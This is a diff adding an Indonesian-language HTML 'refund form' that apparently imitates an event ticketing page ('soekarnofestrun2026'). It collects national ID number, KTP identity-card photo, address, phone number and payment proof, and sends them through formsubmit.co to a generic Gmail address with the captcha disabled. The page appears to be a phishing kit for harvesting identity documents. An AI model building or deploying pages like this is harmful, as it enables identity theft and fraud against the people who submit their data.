@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Form Refund</title>
+
+<style>
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #0d0d0d;
+    color: #fff;
+}
+
+.container {
+    max-width: 600px;
+    margin: 30px auto;
+    background: #1a1a1a;
+    padding: 25px;
+    border-radius: 10px;
+    border: 2px solid orange;
+}
+
+h1 {
+    text-align: center;
+    color: orange;
+    font-size: 20px;
+}
+
+label {
+    display: block;
+    margin-top: 12px;
+    font-size: 14px;
+}
+
+input, textarea {
+    width: 100%;
+    padding: 10px;
+    margin-top: 5px;
+    border-radius: 6px;
+    border: none;
+}
+
+input[type="file"] {
+    background: #fff;
+    color: #000;
+}
+
+.statement {
+    margin-top: 15px;
+    font-size: 13px;
+}
+
+button {
+    width: 100%;
+    padding: 12px;
+    margin-top: 15px;
+    background: gray;
+    border: none;
+    color: #fff;
+    font-size: 16px;
+    border-radius: 8px;
+    cursor: not-allowed;
+}
+
+button.active {
+    background: orange;
+    cursor: pointer;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+<h1>Silahkan Lengkapi Data Diri Beserta Bukti Pembayaran</h1>
+
+<form action="https://formsubmit.co/eticketdigital00@gmail.com" method="POST" enctype="multipart/form-data">
+
+<!-- Redirect setelah submit -->
+<input type="hidden" name="_next" value="https://soekarnofestrun2026-rgb.github.io/QR-Pengembalian-/">
+
+<!-- Disable captcha -->
+<input type="hidden" name="_captcha" value="false">
+
+<label>Nama Lengkap</label>
+<input type="text" name="Nama" required>
+
+<label>NIK</label>
+<input type="number" name="NIK" required>
+
+<label>E-mail</label>
+<input type="email" name="Email" required>
+
+<label>No. Handphone</label>
+<input type="number" name="HP" required>
+
+<label>Alamat Lengkap</label>
+<textarea name="Alamat" required></textarea>
+
+<label>Tanggal Pembelian</label>
+<input type="date" name="Tanggal" required>
+
+<label>Upload Foto KTP</label>
+<input type="file" name="KTP" accept="image/*" required>
+
+<label>Upload Bukti Pembayaran</label>
+<input type="file" name="Bukti" accept="image/*" required>
+
+<div class="statement">
+<input type="checkbox" id="agree">
+Saya menyatakan bahwa data-data di atas benar dan dapat dipertanggungjawabkan.
+</div>
+
+<button type="submit" id="btn" disabled>Kirim Data Refund</button>
+
+</form>
+</div>
+
+<script>
+const agree = document.getElementById("agree");
+const btn = document.getElementById("btn");
+
+agree.addEventListener("change", function(){
+    if(this.checked){
+        btn.disabled = false;
+        btn.classList.add("active");
+    } else {
+        btn.disabled = true;
+        btn.classList.remove("active");
+    }
+});
+</script>
+
+</body>
+</html>
